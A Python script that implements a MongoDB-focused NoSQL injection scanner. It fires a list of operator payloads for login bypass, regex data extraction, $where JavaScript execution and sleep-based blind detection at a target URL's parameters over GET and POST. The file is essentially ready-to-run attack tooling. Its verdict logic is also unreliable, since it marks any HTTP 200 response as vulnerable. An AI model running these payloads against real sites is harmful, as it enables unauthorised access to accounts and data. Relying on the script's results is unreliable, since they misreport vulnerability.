import requests
import time
from urllib.parse import urlparse, parse_qs, urljoin
import logging
import json

# Advanced NoSQL Injection Payloads (MongoDB-focused)
ADVANCED_NOSQL_PAYLOADS = [
    # Authentication bypass
    '{"$gt": ""}',                   # Greater than empty string
    '{"$ne": null}',                 # Not equal to null
    '{"$exists": true}',             # Field exists check
    # Data extraction
    '{"$regex": ".*"}',              # Match any string
    '{"$where": "this.password.match(/^.*/);"}',  # JavaScript regex
    '{"$or": [{"username": "admin"}, {"username": {"$ne": "notadmin"}}]}',  # OR condition bypass
    # Code execution / dangerous operations
    '{"$where": "function(){return true;}"}',  # Arbitrary JS
    '{"$eval": "db.getCollectionNames()"}',    # Eval attempt (older MongoDB)
    # Time-based payloads
    '{"$where": "sleep(5000)"}',              # Sleep 5s (MongoDB < 4.4 with $where)
    '{"$gt": {"$func": "sleep(5000)"}}',      # Alternative sleep attempt
    # Operator injections
    '{"$in": ["admin", "user"]}',             # In array check
    '{"$nin": []}',                           # Not in empty array
]

# Time-based payload for blind detection
TIME_BASED_NOSQL_PAYLOAD = '{"$where": "sleep(5000)"}'

# Error signatures indicating NoSQL injection success
NOSQL_ERROR_SIGNATURES = [
    "mongo", "mongodb",              # Database name in error
    "syntax error",                  # Generic syntax error
    "unexpected operator",           # MongoDB operator misuse
    "invalid query",                 # Query parsing failure
    "function(){", "sleep(",         # JS function reflection
    "collection", "db.",             # Database internals exposed
]

def check_nosql_injection(url, extra_params=None, max_tests=10):
    """
    Advanced NoSQL injection scanner with MongoDB-specific payloads, error detection, and time-based checks.
    
    Args:
        url (str): Target URL (e.g., 'http://example.com/api/login').
        extra_params (dict): Additional params to test (e.g., {'user': 'test'}).
        max_tests (int): Limit payload tests per parameter.
    
    Returns:
        dict: Scan results with vulnerable params and time-based test.
    """
    results = {
        "action": "check_nosql",
        "url": url,
        "vulnerable_params": [],
        "time_based_test": None,
        "detected_endpoints": []  # Bonus: Track vulnerable endpoints
    }

    # Parse URL and parameters
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    original_params = parse_qs(parsed.query)
    if extra_params:
        original_params.update(extra_params)
    if not original_params:
        original_params = {"username": ["test"]}  # Default param if none provided

    headers = {"Content-Type": "application/json"}

    # Test both GET and POST methods
    for method in ["GET", "POST"]:
        for param, values in original_params.items():
            original_value = values[0]
            tested_count = 0

            for payload in ADVANCED_NOSQL_PAYLOADS:
                if tested_count >= max_tests:
                    break
                test_params = original_params.copy()
                try:
                    # Parse payload as JSON if valid, otherwise use as string
                    payload_json = json.loads(payload) if payload.startswith("{") else payload
                    test_params[param] = [payload_json]
                except json.JSONDecodeError:
                    test_params[param] = [payload]

                try:
                    if method == "GET":
                        r = requests.get(base_url, params=test_params, headers=headers, timeout=5)
                    else:
                        r = requests.post(base_url, json={param: payload_json if isinstance(payload_json, dict) else payload}, headers=headers, timeout=5)
                    
                    combined_text = r.text.lower()
                    if any(sig in combined_text for sig in NOSQL_ERROR_SIGNATURES) or r.status_code == 200:
                        results["vulnerable_params"].append({
                            "param": param,
                            "payload": payload,
                            "vulnerable": True,
                            "evidence": f"NoSQL signature or success ({method}) in response",
                            "method": method
                        })
                        results["detected_endpoints"].append({"url": r.url, "method": method})
                    else:
                        results["vulnerable_params"].append({
                            "param": param,
                            "payload": payload,
                            "vulnerable": False,
                            "method": method
                        })
                except requests.RequestException as e:
                    logging.error(f"Request failed for {payload} ({method}): {e}")
                tested_count += 1

    # Time-based NoSQL injection check (POST method)
    first_param = next(iter(original_params))
    try:
        start_time = time.time()
        r = requests.post(base_url, json={first_param: json.loads(TIME_BASED_NOSQL_PAYLOAD)}, headers=headers, timeout=10)
        end_time = time.time()
        if end_time - start_time > 4:  # 4s threshold for 5s delay
            results["time_based_test"] = {
                "payload": TIME_BASED_NOSQL_PAYLOAD,
                "vulnerable": True,
                "evidence": "Significant delay (possible blind NoSQL injection)",
                "method": "POST"
            }
            results["detected_endpoints"].append({"url": r.url, "method": "POST"})
        else:
            results["time_based_test"] = {
                "payload": TIME_BASED_NOSQL_PAYLOAD,
                "vulnerable": False,
                "method": "POST"
            }
    except requests.RequestException:
        results["time_based_test"] = {
            "payload": TIME_BASED_NOSQL_PAYLOAD,
            "vulnerable": False,
            "note": "Request failed during time-based test",
            "method": "POST"
        }

    return results